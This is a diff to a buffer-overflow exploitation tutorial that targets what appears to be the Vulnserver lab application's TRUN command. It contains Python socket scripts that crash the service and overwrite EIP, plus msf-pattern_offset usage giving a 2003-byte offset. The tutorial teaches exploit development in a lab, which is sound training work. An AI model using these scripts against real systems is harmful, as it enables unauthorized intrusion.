@@ -95,6 +95,7 @@ So we've been able to make the application crash by fuzzing it with 2984 byte (A
 Lets try now to write our own python script that will crash the program, instead of using spike.
 
 ```python
+#!/usr/bin/python3
 import socket
 
 s = socket.socket()
@@ -148,21 +149,17 @@ s.send(payload)
 s.close()
 ```
 
-After the crash, we'll see a unique value in EIP (e.g., 386F4337).
-
-![New EIP](Images/image7.png)
-
-convert
+After the crash, we'll see a unique value in EIP (in my case: `386F4337`).
 
 ![New EIP](Images/image7.png)
 
 Now we can find where this occurs using:
 
 ```bash
-msf-pattern_offset -l 2984 -q ****
+msf-pattern_offset -l 2984 -q 386F4337
 ```
 
-This will tell us the exact offset is 2003 bytes.
+This will tell us the exact offset is `2003 bytes`.
 
 ## Step 4: Verifying Control of EIP
 
@@ -174,28 +171,34 @@ Let's verify we have precise control of EIP by crafting a buffer with:
 ```python
 #!/usr/bin/python3
 import socket
-import struct
 
-# Variables
-offset = 2003
+s = socket.socket()
+s.connect(("192.168.177.130", 9999))
+
+# Create a cyclic pattern using MSF pattern_create
+# In Kali: $ msf-pattern_create -l 2984
+
 total_length = 2984
+offset = 2003
+New_EIP = b"BBBB"
 
-# Build our buffer
-buffer = b"TRUN /.:/" 
-buffer += b"A" * offset        # Padding until we hit EIP
-buffer += b"B" * 4             # Overwrite EIP with "BBBB"
-buffer += b"C" * (total_length - offset - 4)  # Data after EIP
+payload = [
+        b"TRUN /.:/",
+        b"A"*offset,
+        New_EIP,
+        b"C"*(total_length-offset-len(New_EIP))
+]
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.0.98", 9999))
-s.recv(1024)
-s.send(buffer)
+payload = b"".join(payload)
+
+s.send(payload)
+
 s.close()
-
-print("Buffer sent with EIP control verification!")
 ```
 
-In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) - confirming we have precise control!
+In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) And our Stack filled with our "C"s - confirming we have precise control!
+
+![control](Images/image8.png)
 
 ## Step 5: Checking for Bad Characters
 
